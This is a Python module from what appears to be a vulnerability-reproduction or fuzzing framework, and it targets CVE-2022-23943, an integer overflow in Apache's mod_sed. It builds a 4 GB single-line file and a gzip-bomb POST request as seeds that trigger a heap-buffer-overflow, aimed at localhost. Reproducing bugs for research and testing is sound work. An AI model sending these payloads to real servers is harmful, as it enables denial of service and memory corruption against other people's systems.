"""CVE-2022-23943 - Integer overflow in mod_sed line buffer.

Trigger via output filter: serve a >4 GB single-line file through
mod_sed's OutputSed directive.  The line buffer in ``sed1.c`` uses an
``unsigned int`` size counter that wraps at 2^32, causing a
heap-buffer-overflow when mod_sed continues writing past the allocated
region.

A second seed (input filter path) sends a gzip bomb via
``Content-Encoding: gzip`` so mod_deflate inflates ~4 GB through
mod_sed's InputSed directive.
"""

import gzip
import io
from pathlib import Path

from apatchy.bugs.base import Bug
from apatchy.utils.logger import get_logger

logger = get_logger(__name__)

# Just over 2^32 to trigger the unsigned-int wrap in sed1.c
OVERFLOW_SIZE = 0xFFFFFFFF + 1  # 4294967296
CHUNK_SIZE = 1024 * 1024  # 1 MB write chunks


class CVE_2022_23943(Bug):
    """Integer overflow in mod_sed line buffer."""

    def setup(self) -> None:
        """Create DocumentRoot with a >4 GB single-line file for the output filter path."""
        htdocs = Path("/tmp/htdocs")
        htdocs.mkdir(exist_ok=True)

        # Small file for the input filter path (POST target)
        in_html = htdocs / "in.html"
        if not in_html.exists():
            in_html.write_text("<html></html>")
            logger.info(f"created {in_html}")

        # Large single-line file for the output filter path (GET target)
        poc_html = htdocs / "poc.html"
        if poc_html.exists() and poc_html.stat().st_size >= OVERFLOW_SIZE:
            logger.info("poc.html already exists, skipping")
            return

        logger.info("creating poc.html (this takes a while)...")
        chunk = b"A" * CHUNK_SIZE
        written = 0
        with open(poc_html, "wb") as f:
            while written < OVERFLOW_SIZE:
                remaining = OVERFLOW_SIZE - written
                if remaining < CHUNK_SIZE:
                    f.write(chunk[:remaining])
                    written += remaining
                else:
                    f.write(chunk)
                    written += CHUNK_SIZE
        logger.info(f"created {poc_html}")

    def generate_seeds(self) -> None:
        """Generate seeds for both output and input filter trigger paths."""
        seeds_dir = self.seeds_dir
        seeds_dir.mkdir(exist_ok=True)

        self._generate_get_seed(seeds_dir)
        self._generate_gzip_seed(seeds_dir)

    def _generate_get_seed(self, seeds_dir: Path) -> None:
        """GET /poc.html - triggers via output filter (OutputSed)."""
        seed_path = seeds_dir / "get_poc.txt"
        if seed_path.exists():
            logger.info(f"{seed_path} already exists, skipping")
            return

        request = (
            "GET /poc.html HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "\r\n"
        ).encode()
        seed_path.write_bytes(request)
        logger.info(f"wrote {seed_path}")

    def _generate_gzip_seed(self, seeds_dir: Path) -> None:
        """POST /in.html with gzip bomb - triggers via input filter (InputSed)."""
        seed_path = seeds_dir / "post_gzip.txt"
        if seed_path.exists():
            logger.info(f"{seed_path} already exists, skipping")
            return

        logger.info("generating gzip bomb seed...")

        data = b"A" * 0xFFFFFFFF
        buf = io.BytesIO()
        with gzip.GzipFile(fileobj=buf, mode="wb", compresslevel=9) as f:
            f.write(data)
        compressed = buf.getvalue()
        logger.debug(f"compressed size: {len(compressed)}")

        request = (
            f"POST /in.html HTTP/1.1\r\n"
            f"Host: localhost\r\n"
            f"Content-Encoding: gzip\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"Content-Length: {len(compressed)}\r\n"
            f"\r\n"
        ).encode() + compressed

        seed_path.write_bytes(request)
        logger.info(f"wrote {seed_path}")

    def clean(self) -> None:
        """Remove generated seeds and htdocs."""
        super().clean()
        htdocs = Path("/tmp/htdocs")
        if htdocs.exists():
            import shutil

            shutil.rmtree(htdocs)
            logger.info(f"Removed {htdocs}")
